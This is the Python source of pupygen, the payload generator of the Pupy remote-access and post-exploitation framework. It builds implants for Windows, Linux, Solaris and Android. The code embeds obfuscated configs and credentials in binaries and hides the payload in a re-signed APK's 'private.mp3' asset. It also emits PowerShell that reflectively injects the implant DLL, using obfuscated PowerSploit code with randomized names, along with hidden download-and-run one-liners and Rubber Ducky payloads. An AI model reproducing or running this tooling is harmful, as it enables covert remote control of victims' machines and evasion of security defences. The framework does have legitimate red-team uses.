#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import argparse
import sys
import os.path
import random
import string
import zipfile
import tarfile
import tempfile
import shutil
import subprocess

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))

if __name__ == '__main__':
    sys.path.insert(0, os.path.join(ROOT, 'pupy', 'library_patches'))

import marshal
import cPickle
import base64
import os
import pylzma
import struct

from io import BytesIO

from pupylib.utils.network import get_listener_ip, get_listener_port
from pupylib.utils.jarsigner import jarsigner
from pupylib.payloads import dependencies
from pupylib.payloads.dotnet import dotnet_serve_payload, DotNetPayload
from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
from pupylib.payloads.rubber_ducky import rubber_ducky
from pupylib.utils.obfuscate import compress_encode_obfs
from pupylib.PupyConfig import PupyConfig
from pupylib.PupyCompile import pupycompile
from pupylib.PupyLogger import getLogger
from pupylib.PupyOutput import Success, Warn, Error, List, Table, MultiPart, Color
from network.conf import transports, launchers
from network.lib.base_launcher import LauncherError
from scriptlets import (
    load_scriptlets, ScriptletsPacker, ScriptletArgumentError
)
from modules.lib.windows.powershell import obfuscatePowershellScript
from pupylib.PupyCredentials import Credentials, EncryptionError

logger = getLogger('gen')

HARDCODED_CONF_SIZE= 65536

class NoOutput(Exception):
    pass

def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
    logger.debug("generating binary %s with conf: %s"%(path, conf))

    binary=b""
    with open(path, 'rb') as f:
        binary=f.read()
    i=0
    offsets=[]
    while True:
        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n", i+1)
        if i==-1:
            break
        offsets.append(i)

    if not offsets:
        raise Exception("Error: the offset to edit the config have not been found")
    elif len(offsets) > 1:
        raise Exception("Error: multiple offsets to edit the config have been found")

    new_conf = marshal.dumps(compile(get_raw_conf(display, conf), '<config>', 'exec'))
    uncompressed = len(new_conf)
    if compressed_config:
        new_conf = pylzma.compress(new_conf)
    compressed = len(new_conf)
    new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
    new_conf_len = len(new_conf)

    if new_conf_len > HARDCODED_CONF_SIZE:
        raise Exception(
            'Error: config or offline script too long ({}/{} bytes)'
            'You need to recompile the dll with a bigger buffer'.format(new_conf_len, HARDCODED_CONF_SIZE)
        )

    new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)

    logger.debug('Free space: %d', HARDCODED_CONF_SIZE-new_conf_len)

    offset = offsets[0]
    binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
    return binary

def get_raw_conf(display, conf, obfuscate=False, verbose=False):

    credentials = Credentials(role='client')

    if "offline_script" not in conf:
        offline_script=""
    else:
        offline_script=conf["offline_script"]

    launcher = launchers[conf['launcher']]()
    launcher.parse_args(conf['launcher_args'])

    required_credentials = set(launcher.credentials) \
      if hasattr(launcher, 'credentials') else set([])

    transport = launcher.get_transport()
    transports_list = []

    if transport:
        transports_list = [transport]
        if transports[transport].credentials:
            for name in transports[transport].credentials:
                required_credentials.add(name)
    elif not transport:
        for n, t in transports.iteritems():
            transports_list.append(n)

            if t.credentials:
                for name in t.credentials:
                    required_credentials.add(name)

    available = []
    not_available = []

    for cred in required_credentials:
        if credentials[cred]:
            available.append(cred)
        else:
            not_available.append(cred)

    display(
        List(available, bullet=Color('+', 'green'),
        caption=Success('Required credentials (found)')))

    if not_available:
        display(
            List(not_available, bullet=Color('-', 'red'),
            caption=Error('Required credentials (not found)')))

    embedded_credentials = '\n'.join([
        '{}={}'.format(credential, repr(credentials[credential])) \
        for credential in required_credentials if credentials[credential] is not None
    ])+'\n'

    if verbose:
        config_table = [{
            'KEY': k, 'VALUE': 'PRESENT' if (k in ('offline_script') and v) else (
                unicode(v) if type(v) not in (tuple,list,set) else ' '.join(
                    unicode(x) for x in v))
        } for k,v in conf.iteritems() if v]

        display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))

    config = '\n'.join([
        'pupyimporter.pupy_add_package({})'.format(
            repr(cPickle.dumps({
                'pupy_credentials.pye':
                bytes(pupycompile(embedded_credentials, obfuscate=True))
            }))),
        dependencies.importer(set(
            'network.transports.{}'.format(transport) for transport in transports_list
        ), path=ROOT),
        'import sys',
        'sys.modules.pop("network.conf", "")',
        'import network.conf',
        'LAUNCHER={}'.format(repr(conf['launcher'])),
        'LAUNCHER_ARGS={}'.format(repr(conf['launcher_args'])),
        'CONFIGURATION_CID={}'.format(conf.get('cid', 0x31338)),
        'DELAYS={}'.format(repr(conf.get('delays', [
            (10, 5, 10), (50, 30, 50), (-1, 150, 300)]))),
        'pupy.cid = CONFIGURATION_CID',
        'debug={}'.format(bool(conf.get('debug', False))),
        'SCRIPTLETS={}'.format(repr(offline_script) if offline_script else '""')
    ])

    return compress_encode_obfs(config) if obfuscate else config

def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def updateTar(arcpath, arcname, file_path):
    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
    try:
        with tarfile.open(arcpath, 'r') as tfr:
            names=tfr.getnames()
            tfr.extractall(tempdir)
            for root, dirs, files in os.walk(tempdir):
                for dir in dirs:
                    os.chmod(os.path.join(root, dir), 0700)
                for file in files:
                    os.chmod(os.path.join(root, file), 0600)

            with tarfile.open(arcpath+"2", 'w:gz') as tfw:
                for n in names:
                    if n!=arcname:
                        tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
                    else:
                        tfw.add(file_path, arcname=n, recursive=False)
        shutil.copy(arcpath+"2", arcpath)
    finally:
        shutil.rmtree(tempdir)

def get_edit_apk(display, path, conf, compressed_config=None, debug=False):

    credentials = Credentials(role='control')

    priv_key = credentials['APK_PRIV_KEY']
    pub_key = credentials['APK_PUB_KEY']

    if not priv_key or not pub_key:
        raise ValueError(
            'CONTROL_APK_PRIV_KEY/CONTROL_APK_PUB_KEY credentials missing (old credentials)')

    tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
    fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
    try:
        packed_payload=pack_py_payload(display, get_raw_conf(display, conf), debug)
        shutil.copy(path, tempapk)

        #extracting the python-for-android install tar from the apk
        zf=zipfile.ZipFile(path,'r')
        zf.extract("assets/private.mp3", tempdir)
        zf.close()

        with open(os.path.join(tempdir,"pp.py"),'w') as w:
            w.write(packed_payload)
        import py_compile
        py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))

        display(Success('Packaging the apk ... (can take 10-20 seconds)'))

        #updating the tar with the new config
        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir, "pp.pyo"))
        #repacking the tar in the apk

        with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
            updateZip(tempapk, "assets/private.mp3", t.read())

        #signing the tar
        result = BytesIO()
        jarsigner(priv_key, pub_key, tempapk, result)
        return result.getvalue()

    finally:
        #cleaning up
        shutil.rmtree(tempdir, ignore_errors=True)
        os.unlink(tempapk)

def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64=False, x86=False, as_str=False):

    SPLIT_SIZE = 100000
    x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""

    if both:
        code = """
        $PEBytes = ""
        if ([IntPtr]::size -eq 4){{
            {0}
            $PEBytesTotal = [System.Convert]::FromBase64String({1})
        }}
        else{{
            {2}
            $PEBytesTotal = [System.Convert]::FromBase64String({3})
        }}
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """ # {1} = x86dll, {3} = x64dll
    else:
        code = """
        {0}
        $PEBytesTotal = [System.Convert]::FromBase64String({1})
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """

    if both or x64:
        # generate x64 ps1
        binaryX64 = base64.b64encode(
            generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0])
        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
        for i, aPart in enumerate(binaryX64parts):
            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
            x64ConcatCode += "$PEBytes{0}+".format(i)
        display(Success('X64 dll loaded and {0} variables used'.format(i + 1)))

    if both or x86:
        # generate x86 ps1
        binaryX86 = base64.b64encode(
            generate_binary_from_template(display, conf, 'windows', arch='x86', shared=True)[0])
        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
        for i, aPart in enumerate(binaryX86parts):
            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
            x86ConcatCode += "$PEBytes{0}+".format(i)
        display(Success('X86 dll loaded and {0} variables used'.format(i + 1)))

    script = obfuscatePowershellScript(
        open(os.path.join(
            ROOT, "external", "PowerSploit",
            "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())

    # adding some more obfuscation
    random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
    script      = script.replace('Invoke-ReflectivePEInjection', random_name)
    code        = code.replace('Invoke-ReflectivePEInjection', random_name)

    payload = None

    if both:
        payload = "{0}\n{1}".format(
            script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]))
    elif x64:
        payload = "{0}\n{1}".format(script, code.format(x64InitCode, x64ConcatCode[:-1]))
    elif x86:
        payload = "{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1]))

    if as_str:
        return payload

    if not outpath:
        outfile = tempfile.NamedTemporaryFile(
            dir=output_dir or '.',
            prefix='pupy_',
            suffix='.ps1',
            delete=False
        )
    else:
        try:
            os.unlink(outpath)
        except:
            pass

        outfile = open(outpath, 'w+b')

    outpath = outfile.name
    outfile.write(payload)
    outfile.close()

    return outpath

def generate_binary_from_template(display, config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
    ARCH_CONVERT = {
        'amd64': 'x64', 'x86_64': 'x64',
        'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
    }

    TO_PLATFORM = {
        'x64': 'intel',
        'x86': 'intel'
    }

    TO_ARCH = {
        'intel': {
            '32bit': 'x86',
            '64bit': 'x64'
        }
    }

    arch = arch.lower()
    arch = ARCH_CONVERT.get(arch, arch)
    if bits:
        arch = TO_ARCH[TO_PLATFORM[arch]]

    CLIENTS = {
        'android': (get_edit_apk, 'pupy.apk', False),
        'linux': (get_edit_binary, TEMPLATE_FMT, True),
        'solaris': (get_edit_binary, TEMPLATE_FMT, True),
        'windows': (get_edit_binary, TEMPLATE_FMT, False),
    }

    SUFFIXES = {
        'windows': ('exe', 'dll'),
        'linux':   ('lin', 'lin.so'),
        'solaris': ('sun', 'sun.so'),
    }

    osname = osname.lower()

    if osname not in CLIENTS.keys():
        raise ValueError('Unknown OS ({}), known = '.format(
            osname, ', '.join(CLIENTS.keys())))

    generator, template, makex = CLIENTS[osname]

    if '{arch}' in template and not arch:
        raise ValueError('arch required for the target OS ({})'.format(osname))

    shared_ext = 'xxx'
    non_shared_ext = 'xxx'

    if osname in SUFFIXES:
        non_shared_ext, shared_ext = SUFFIXES[osname]

    debug_fmt = 'd' if debug else ''

    if shared:
        makex = False
        ext = shared_ext
    else:
        ext = non_shared_ext

    filename = template.format(arch=arch, debug=debug_fmt, ext=ext, unk='.unc' if not compressed else '')
    template = os.path.join(
        'payload_templates', filename
    )

    if not os.path.isfile(template):
        template = os.path.join(
            ROOT, 'payload_templates', filename
        )

    if not os.path.isfile(template):
        raise ValueError('Template not found ({})'.format(template))


    config_table = [{
        'KEY': k, 'VALUE': 'PRESENT' if (k in ('offline_script') and v) else (
                unicode(v) if type(v) not in (tuple,list,set) else ' '.join(
                    unicode(x) for x in v))
    } for k,v in config.iteritems() if v]

    display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))

    return generator(display, template, config, compressed, debug), filename, makex

def pack_scriptlets(display, scriptlets, args_scriptlet, os=None, arch=None, debug=False):
    sp = ScriptletsPacker(os, arch)

    for sc in args_scriptlet:
        tab = sc.split(",", 1)
        sc_args={}
        name=tab[0]
        if len(tab)==2:
            try:
                for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                    sc_args[x.strip()]=y.strip()
            except:
                raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)

        if name not in scriptlets:
            raise ValueError("unknown scriptlet %s, valid choices are : %s"%(
                repr(name), [
                    x for x in scriptlets.iterkeys()
                ]))

        display(Success('loading scriptlet {}{}'.format(
            repr(name),
            'with args {}'.format(
                ' '.join(
                    '{}={}'.format(k, repr(v)) for k,v in sc_args.iteritems())
            ) if sc_args else '')))

        try:
            sp.add_scriptlet(scriptlets[name], sc_args)

        except ScriptletArgumentError as e:
            display(MultiPart(
                Error('Scriptlet {} argument error: {}'.format(repr(name), str(e))),
                scriptlets[name].format_help()))
            raise ValueError('{}'.format(e))

    script_code = sp.pack()
    return script_code

class InvalidOptions(Exception):
    pass

PAYLOAD_FORMATS = [
    'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky', 'csharp', '.NET', '.NET_oneliner'
]

CLIENT_OS = ['android', 'windows', 'linux', 'solaris']
CLIENT_ARCH = ['x86', 'x64']

def get_parser(base_parser, config):
    parser = base_parser(description='Generate payloads for windows, linux, osx and android.')
    parser.add_argument('-f', '--format', default=config.get('gen', 'format'),
                            choices=PAYLOAD_FORMATS, help="(default: client)")
    parser.add_argument('-O', '--os', default=config.get('gen', 'os'),
                            choices=CLIENT_OS, help='Target OS (default: windows)')
    parser.add_argument('-A', '--arch', default=config.get('gen', 'arch'),
                            choices=CLIENT_ARCH, help='Target arch (default: x86)')
    parser.add_argument('-U', '--uncompressed', default=False, action='store_true',
                            help='Use uncompressed template')
    parser.add_argument('-P', '--packer', default=config.get('gen', 'packer'), help='Use packer when \'client\' output format (default: %(default)s)')
    parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
    parser.add_argument('-o', '--output', help="output filename")
    parser.add_argument('-d', '--delays-list',
        action='append', type=int, metavar=('<ATTEMPTS>', '<MIN SEC>', '<MAX SEC>'), nargs=3,
        help='Format: <max attempts> <min delay (sec)> <max delay (sec)>')

    default_payload_output = '.'
    try:
        default_payload_output = config.get_path('payload_output', dir=True)
    except ValueError, e:
        logger.error('Invalid value for "payload_output" in config file: %s', e)

    parser.add_argument('-D', '--output-dir', default=default_payload_output, help="output folder (default: %(default)s)")
    parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
    parser.add_argument('-l', '--list', action='store_true', help="list available formats, transports, scriptlets and options")
    parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                            action='store_true', help="In case of autodetection prefer external IP")
    parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
    parser.add_argument('--oneliner-nothidden', default=False, action='store_true', help="Powershell script not hidden target side (default: %(default)s)")
    parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
    parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
    parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
    parser.add_argument(
        'launcher', choices=[
            x for x in launchers.iterkeys()
        ], default=config.get('gen', 'launcher') or 'connect', nargs='?',
        help="Choose a launcher. Launchers make payloads behave differently at startup."
    )
    parser.add_argument(
        'launcher_args', default=config.get('gen', 'launcher_args'),
        nargs=argparse.REMAINDER, help="launcher options")
    return parser

def pupygen(args, config, pupsrv, display):
    scriptlets = load_scriptlets(args.os, args.arch)

    if args.list:
        display(MultiPart([
            Table([{
                'FORMAT': f, 'DESCRIPTION': d
            } for f,d in {
                'client': 'generate client binary (linux/windows/apk/..)',
                'py': 'fully packaged python file',
                'py_oneliner': 'same as \'py\' format but served over http',
                'ps1': 'generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process',
                'ps1_oneliner': 'load pupy remotely from memory with a single command line using powershell',
                'csharp': 'generate C# source (.cs) that executes pupy',
                '.NET': 'compile a C# payload into a windows executable.',
                '.NET_oneliner': 'Loads .NET assembly from memory via powershell'
            }.iteritems()], ['FORMAT', 'DESCRIPTION'], Color('Available formats (usage: -f <format>)', 'yellow')),

            Table([{
                'TRANSPORT': name, 'DESCRIPTION': t.info
            } for name, t in transports.iteritems()],
            ['TRANSPORT', 'DESCRIPTION'], Color('Available transports (usage: -t <transport>)', 'yellow')),

            Table([{
                'SCRIPTLET': name, 'DESCRIPTION': sc.description, 'ARGS': '; '.join(
                    '{}={}'.format(k,v) for k,v in sc.arguments.iteritems()
                )
            } for name, sc in scriptlets.iteritems()],
            ['SCRIPTLET', 'DESCRIPTION', 'ARGS'], Color(
                'Available scriptlets for {}/{} '
                '(usage: -s <scriptlet>[,arg1=value1,arg2=value2]'.format(
                    args.os or 'any', args.arch or 'any'), 'yellow'))
        ]))

        raise NoOutput()

    if args.workdir:
        os.chdir(args.workdir)

    script_code=""

    try:
        if args.scriptlet:
            script_code = pack_scriptlets(
                display,
                scriptlets,
                args.scriptlet,
                os=args.os,
                arch=args.arch,
                debug=args.debug_scriptlets)

    except ValueError, e:
        display(Error(e.message))
        raise NoOutput()

    launcher = launchers[args.launcher]
    while True:
        try:
            launcher.arg_parser.parse_args(args.launcher_args)
        except LauncherError as e:
            if str(e).strip().endswith("--host is required") and "--host" not in args.launcher_args:
                myip = get_listener_ip(external=args.prefer_external, config=config)
                if not myip:
                    raise ValueError("--host parameter missing and couldn't find your local IP. "
                                         "You must precise an ip or a fqdn manually")
                myport = get_listener_port(config, external=args.prefer_external)

                display(Warn(
                    'Required argument missing, automatically adding parameter '
                    '--host {}:{} from local or external ip address'.format(myip, myport)))

                if '-t' in args.launcher_args or '--transport' in args.launcher_args:
                    args.launcher_args += ['--host', '{}:{}'.format(myip, myport)]
                else:
                    args.launcher_args += [
                        '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
                    ]
            elif str(e).strip().endswith('--domain is required') and '--domain' not in args.launcher_args:
                domain = config.get('pupyd', 'dnscnc').split(':')[0]
                if not domain or '.' not in domain:
                    display(Error('DNSCNC disabled!'))
                    return

                display(Warn(
                    'Required argument missing, automatically adding parameter'
                    '--domain {} from configuration file'.format(domain)))

                args.launcher_args = [
                    '--domain', domain
                ]

            else:
                display(launcher.arg_parser.format_help())
                return
        else:
            break

    conf = {
        'launcher': args.launcher,
        'launcher_args': args.launcher_args,
        'offline_script': script_code,
        'debug': args.debug,
        'cid': hex(random.SystemRandom().getrandbits(32))
    }

    if args.delays_list:
        conf['delays'] = sorted(args.delays_list, key=lambda x: x[0])

    outpath = args.output

    if not os.path.isdir(args.output_dir):
        display(Success('Creating the local folder {} for generating payloads'.format(repr(args.output_dir))))
        os.makedirs(args.output_dir)

    if args.format == 'client':
        display(Success('Generate client: {}/{}'.format(args.os, args.arch)))

        data, filename, makex = generate_binary_from_template(
            display,
            conf, args.os,
            arch=args.arch, shared=args.shared, debug=args.debug,
            compressed=not (args.uncompressed or args.packer)
        )

        if not outpath:
            template, ext = filename.rsplit('.', 1)
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix=template+'.',
                suffix='.'+ext,
                delete=False
            )
        else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        outfile.write(data)
        outfile.close()

        if makex:
            os.chmod(outfile.name, 0711)

        if args.packer:
            packingFinalCmd = args.packer.replace('%s', outfile.name)
            display('Packing payload with this command: {}'.format(packingFinalCmd))
            subprocess.check_call(
                packingFinalCmd,
                shell=True
            )

        outpath = outfile.name

    elif args.format in ('py', 'pyinst'):
        linux_modules = ''
        if not outpath:
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix='pupy_',
                suffix='.py',
                delete=False
            )
        else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        if args.format == 'pyinst':
            linux_modules = getLinuxImportedModules()
        packed_payload = pack_py_payload(display, get_raw_conf(display, conf, verbose=True), args.debug)

        outfile.write('\n'.join([
            '#!/usr/bin/env python',
            '# -*- coding: utf-8 -*-',
            linux_modules,
            packed_payload
        ]))
        outfile.close()

        outpath = outfile.name

    elif args.format == 'py_oneliner':
        packed_payload = pack_py_payload(display, get_raw_conf(display, conf, verbose=True), args.debug)
        i = conf["launcher_args"].index("--host")+1
        link_ip = conf["launcher_args"][i].split(":",1)[0]

        serve_payload(display, pupsrv, packed_payload, link_ip=link_ip)

        raise NoOutput()

    elif args.format == 'csharp':
        if args.os != 'windows':
            raise ValueError('This format only support windows')

        rawdll = generate_binary_from_template(display, conf, 'windows', arch=args.arch, shared=True)[0]
        dn = DotNetPayload(display, pupsrv, conf, rawdll, outpath=outpath, output_dir=args.output_dir)
        outpath = dn.gen_source()

    elif args.format == '.NET':
        if args.os != 'windows':
            raise ValueError('This format only support windows')

        rawdll = generate_binary_from_template(display, conf, 'windows', arch=args.arch, shared=True)[0]
        dn = DotNetPayload(display, pupsrv, conf, rawdll, outpath=outpath, output_dir=args.output_dir)
        outpath = dn.gen_exe()

        if outpath is None:
            raise NoOutput()

    elif args.format == '.NET_oneliner':
        i = conf['launcher_args'].index('--host')+1
        link_ip, _ = conf['launcher_args'][i].split(':',1)
        rawdll = generate_binary_from_template(display, conf, 'windows', arch=args.arch, shared=True)[0]

        dotnet_serve_payload(display, pupsrv, rawdll, conf, link_ip=link_ip)

        raise NoOutput()

    elif args.format == 'ps1':
        outpath = generate_ps1(display, conf, outpath=outpath, output_dir=args.output_dir, both=True)

    elif args.format == 'ps1_oneliner':
        if conf['launcher'] in ["connect", "auto_proxy"]:
            from pupylib.payloads.ps1_oneliner import serve_ps1_payload
            link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
            if not args.no_use_proxy:
                useTargetProxy = True
            else:
                useTargetProxy = False

            serve_ps1_payload(
                display, pupsrv, conf,
                link_ip=link_ip, useTargetProxy=useTargetProxy,
                nothidden=args.oneliner_nothidden)
            raise NoOutput()

        elif conf['launcher'] == 'bind':
            from pupylib.payloads.ps1_oneliner import send_ps1_payload
            outpath, target_ip, bind_port = "", None, None
            bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
            if '--oneliner-host' in conf['launcher_args']:
                target_ip=conf['launcher_args'][conf['launcher_args'].index('--oneliner-host')+1]
                send_ps1_payload(
                    display, conf,
                    bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)

                display(Success(
                    'You have to connect manually to the target {} '
                    'with "connect --host {0}:{1}"'.format(target_ip, bind_port)))

                raise NoOutput()
            else:
                raise ValueError('You have to give me the --oneliner-host argument')
        else:
            raise ValueError('ps1_oneliner with {0} mode is not implemented yet'.format(conf['launcher']))

    elif args.format == 'rubber_ducky':
        rubber_ducky(display, conf, config).generateAllForOStarget()
        raise NoOutput()

    else:
        raise ValueError("Type %s is invalid."%(args.format))

    display(Success('OUTPUT_PATH: {}'.format(os.path.abspath(outpath))))
    display(Success('SCRIPTLETS:  {}'.format(args.scriptlet)))
    display(Success('DEBUG:       {}'.format(args.debug)))

    return os.path.abspath(outpath)

def main():
    from pupylib.utils.term import hint_to_text
    from traceback import print_exc

    def display(data):
        print hint_to_text(data)

    Credentials.DEFAULT_ROLE = 'CLIENT'

    config = PupyConfig()
    Credentials(config=config, validate=True)

    parser = get_parser(argparse.ArgumentParser, config)
    try:
        args = parser.parse_args()
        pupygen(args, config, None, display)

    except NoOutput:
        sys.exit(0)

    except InvalidOptions:
        sys.exit(1)

    except (ValueError, EncryptionError), e:
        if args.debug:
            print_exc()
        display(Error(e))

    except Exception, e:
        print_exc()
        sys.exit(str(e))


if __name__ == '__main__':
    main()
